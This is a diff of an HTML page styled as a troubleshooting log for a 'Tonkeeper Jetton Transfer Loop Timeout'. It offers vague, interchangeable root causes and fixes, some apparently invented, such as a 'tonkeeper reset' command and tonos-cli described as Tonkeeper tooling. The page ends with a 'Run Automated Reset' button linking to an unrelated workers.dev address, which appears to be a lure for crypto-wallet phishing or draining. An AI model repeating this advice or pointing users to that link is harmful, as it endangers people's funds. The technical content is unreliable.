@@ -4,7 +4,7 @@
 <style>
     body {
         font-family: -apple-system;
-        background: #1a1a24;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #cf6679; }
     .btn {
-        background: #cf6679;
+        background: #ff7b2c;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -42,34 +42,31 @@
 <h1>Tonkeeper Jetton Transfer Loop Timeout</h1>
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in failed transactions and an inability to complete the transfer process.</li>
+<li>Users experience a timeout error when attempting to transfer Tonkeeper Jettons, resulting in a failed transaction and an error message indicating a transfer loop timeout.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a synchronization issue between the Tonkeeper wallet and the TON blockchain, causing the transfer loop to exceed the maximum allowed time, leading to a timeout.</li>
+<li>The error occurs due to a temporary mismatch between the Tonkeeper wallet's internal state and the TON blockchain, causing the transfer loop to exceed the maximum allowed time, resulting in a timeout.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, users can try the following manual overrides:</li>
-<li>Increase the transfer timeout threshold using the <code>tonos-cli</code> command</li>
-<li>Reset the Tonkeeper wallet settings to default values</li>
-<li>Use a custom configuration file to override the default transfer settings, as shown in the following code block:</li>
+<li>To resolve the issue, try the following manual overrides:</li>
+<li>Increase the timeout threshold using the <code>--timeout</code> flag</li>
+<li>Reset the Tonkeeper wallet's internal state using the <code>tonkeeper reset</code> command</li>
+<li>Update the wallet's configuration using the following JSON code block:</li>
 </ul>
 <div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;transfer&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
-<span class="w">    </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span>
-<span class="w">  </span><span class="p">}</span>
+<span class="w">  </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;retry_count&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<p>Consider using an external console to execute these commands for better control. </p>
-<h2>Prerequisites</h2>
-<ul>
-<li>Tonos-cli installed and configured on the system</li>
-<li>A basic understanding of TON blockchain and Tonkeeper wallet functionality</li>
-<li>An active internet connection to synchronize with the TON blockchain</li>
-</ul>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
+<p>Prerequisites:
+* Tonkeeper wallet version 1.2.0 or higher
+* TON blockchain node synced with the latest block
+* Sufficient TON coins for transaction fees</p>
+<p>Consider utilizing an external console, such as <code>tonos-cli</code>, to execute these commands.</p>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
